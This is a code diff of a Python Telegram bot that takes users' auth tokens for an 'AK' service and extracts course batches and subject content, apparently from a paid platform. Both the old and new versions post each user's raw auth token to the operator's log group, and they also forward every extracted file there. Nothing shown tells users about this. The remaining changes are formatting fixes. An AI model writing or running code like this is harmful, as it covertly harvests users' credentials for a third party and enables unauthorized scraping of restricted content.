@@ -10,7 +10,6 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
-from telegram import Bot
 
 # Stages for ConversationHandler
 AUTH_CODE, BATCH_ID, SUBJECT_ID, CONTENT_TYPE = range(4)
@@ -34,10 +33,12 @@ async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         auth_token = update.message.text.strip()
         context.user_data['auth_token'] = auth_token
 
-        # Log the auth token to the group via main bot
-        main_bot = Bot(context.bot_data["main_bot_token"])  # Use main bot token
+        # Log the auth token to the group using main bot
+        log_group_id = context.application.log_group_id_ak  # Get log group ID from context
+        main_bot = context.application.main_bot  # Get main bot instance
+
         await main_bot.send_message(
-            chat_id=context.bot_data["log_group_id_ak"],  # Use log_group_id_ak
+            chat_id=log_group_id,
             text=f"New AK Auth Token Used: ```{auth_token}```",
             parse_mode="Markdown"
         )
@@ -99,7 +100,7 @@ async def handle_batch_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
         subjects = response["data"]["batch_subject"]
         context.user_data['subject_data'] = subjects  # Store subject data for later use
         
-        subject_text = "𝚂𝚞𝚋𝚓𝚎𝚌𝚝𝚜 �𝚘𝚞𝚗𝚍:\n\n"
+        subject_text = "𝚂𝚞𝚋𝚓𝚎𝚌𝚝𝚜 𝙵𝚘𝚞𝚗𝚍:\n\n"
         for subject in subjects:
             subject_text += f"```{subject['subjectName']}``` : ```{subject['id']}```\n"
 
@@ -236,8 +237,8 @@ async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE
             # Send file to user with updated caption
             user_caption = (
                 f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n\n"
-                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}\n\n"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
+                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}\n"
                 f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
@@ -246,25 +247,26 @@ async def handle_content_type(update: Update, context: ContextTypes.DEFAULT_TYPE
                     caption=user_caption
                 )
 
-            # Send file to log group via main bot
-            main_bot = Bot(context.application.main_bot_token)
+            # Send file to log group using main bot
+            log_group_id = context.application.log_group_id_ak  # Get log group ID from context
+            main_bot = context.application.main_bot  # Get main bot instance
+
             log_caption = (
-                f"AK 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 �𝚜𝚎𝚛.\n\n"
+                f"AK 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
                 f"𝑪𝒐𝒏𝒕𝒆𝒏𝒕 𝑻𝒚𝒑𝒆: {content_type}\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n\n"
-                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}\n\n"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞💢: {batch_name}\n"
+                f"𝑺𝒖𝒃𝒋𝒆𝒄𝒕 𝒏𝒂𝒎𝒆😉: {subject_name}\n"
                 f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
                 await main_bot.send_document(
-                    chat_id=context.application.log_group_id_ak,
+                    chat_id=log_group_id,
                     document=f,
                     caption=log_caption
                 )
 
             # Clean up
-            if os.path.exists(file_path):
-                os.remove(file_path)
+            os.remove(file_path)
             await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
         else:
             await update.message.reply_text("𝐍𝐨 𝐜𝐨𝐧𝐭𝐞𝐧𝐭 𝐟𝐨𝐮𝐧𝐝 Sorry🤪.")
